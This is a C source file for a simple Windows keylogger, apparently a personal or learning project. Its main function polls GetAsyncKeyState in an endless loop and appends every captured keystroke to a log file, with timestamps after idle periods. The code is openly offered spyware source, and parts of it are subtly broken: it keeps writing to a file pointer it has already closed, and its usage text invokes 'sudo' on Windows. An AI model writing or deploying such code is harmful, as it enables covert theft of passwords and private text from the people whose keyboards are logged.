/* #############################################################################
## DESCRIPTION: Keylogger Functions Definition.
## NAME: keylogger.c
## AUTHOR: Lucca Pessoa da Silva Matos
## DATE: 14.04.2020
## VERSION: 1.1
##############################################################################*/

// =============================================================================
// LIBRARYS
// =============================================================================

#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <unistd.h>
#include <stdbool.h>
#include "keylogger.h"

#include <windows.h>
#define IS_WINDOWS_VISIBLE 0

#if defined ( __unix )
  #error This code is OS windows dependant, cannot compile on another system
#endif

// =============================================================================
// FUNCTIONS
// =============================================================================

void set_portuguese(void){
  setlocale(LC_ALL, "Portuguese");
}

// =============================================================================

void helper(void){
  printf(
    "\n"
    "Usage:\n"
    "     sudo ./keyloger [ -s | -f file] [-h]\n"
    "\n"
    "Options:\n"
    "  -f    file    Path to the output file.\n"
    "  -s            Print to stdout.\n"
    "  -h            This help message.\n");
  exit(EXIT_FAILURE);
}

// =============================================================================

void cabecalho(void){
  printf("\n**************************************************");
  printf("\n*                                                *");
  printf("\n*                                                *");
  printf("\n* IMPLEMENTANDO SIMPLES KEYLOGGER - LUCCA PESSOA *");
  printf("\n*                                                *");
  printf("\n*                                                *");
  printf("\n**************************************************\n\n");
}

// =============================================================================

bool check_file_pointer_exist(FILE *file_pointer){
  return file_pointer ? true : false;
}

// =============================================================================

int keylogger(FILE *file_pointer,
      const char *file_name,
      time_t time_start,
      time_t time_now,
      time_t time_lastkey)
{
  // Getting new file pointer.
  FILE *file_pointer_new;
  // Setting times.
  time(&time_start);
  time(&time_now);
  time(&time_lastkey);
  // Insert Information in file.
  fprintf(file_pointer, "Starting Keylogger - Data - %s", asctime(localtime(&time_start)));
  // Loop.
  while(true){
    // Setting time now.
    time(&time_now);
    //ASCII Values.
    for(int tecla = 8; tecla <= 222; tecla++){
      // User press.
      if(GetAsyncKeyState(tecla)==-32767){
        // Insert this data in file.
        fputc(tecla, file_pointer);
        // Clean buff
        fflush(file_pointer);
        // Set last key time.
        time(&time_lastkey);
      }
    }
    // Insert date before 10s without any action.
    if (time_now - time_lastkey > 10) {
      // Close current file.
      fclose(file_pointer);
      // Reopen new file.
      file_pointer_new = fopen(file_name, "a");
      // Insert data into the file.
      fprintf(file_pointer_new, "\nKeylogger timeout (10s) - Data - %s", asctime(localtime(&time_now)));
      // Clean buffer.
      fflush(file_pointer_new);
      // Set last key time.
      time(&time_lastkey);
    }
  }
  // Close pointer new file
  fclose(file_pointer_new);
}
